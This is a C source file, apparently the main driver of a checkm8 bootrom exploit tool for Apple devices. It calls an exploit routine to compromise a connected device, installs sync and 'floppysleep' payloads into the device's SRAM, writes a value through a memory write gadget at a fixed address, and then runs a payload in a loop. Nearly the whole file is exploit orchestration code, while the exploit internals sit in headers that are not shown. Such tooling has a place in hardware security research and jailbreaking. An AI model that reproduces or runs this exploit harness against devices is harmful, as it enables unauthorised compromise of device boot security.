#include "checkm8.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <float.h>

#include "command.h"
#include "payload.h"
#include "usb_helpers.h"

#ifdef CHECKM8_LOGGING

#include <stdarg.h>
#include <execinfo.h>

#endif

void checkm8_debug_indent(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    void *traces[100];
    int depth = backtrace(traces, 100) - 5;
    for(int i = 0; i < depth; i++)
    {
        printf("\t");
    }
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

void checkm8_debug_block(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

int main()
{
    struct dev_cmd_resp *resp;
    struct pwned_device *dev = exploit_device();
    if(dev == NULL || dev->status == DEV_NORMAL)
    {
        printf("Failed to exploit device\n");
        return -1;
    }

    if(IS_CHECKM8_FAIL(open_device_session(dev)))
    {
        printf("failed to open device session\n");
        return -1;
    }

    if(IS_CHECKM8_FAIL(install_payload(dev, PAYLOAD_SYNC, SRAM)))
    {
        printf("failed to install sync payload\n");
        return -1;
    }

    if(IS_CHECKM8_FAIL(install_payload(dev, PAYLOAD_FLOPPYSLEEP, SRAM)))
    {
        printf("failed to install task sleep payload\n");
        return -1;
    }

    float init_a = -7.504355E-39f;
    resp = write_gadget(dev, 0x180154000, (unsigned char *) &init_a, sizeof(float));
    free_dev_cmd_resp(resp);

    resp = execute_payload(dev, PAYLOAD_SYNC, 0, 0);
    if(IS_CHECKM8_FAIL(resp->ret))
    {
        printf("failed to execute bootstrap\n");
        return -1;
    }

    free_dev_cmd_resp(resp);

    while(1)
    {
        resp = execute_payload(dev, PAYLOAD_FLOPPYSLEEP, 0, 1, 0x180154000);
        if(IS_CHECKM8_FAIL(resp->ret))
        {
            printf("failed to execute flopsleep payload\n");
            return -1;
        }

        printf("retval is %08lli\n", resp->retval);
        free_dev_cmd_resp(resp);

        usleep(2000000);
    }

    close_device_session(dev);
    free_device(dev);
}
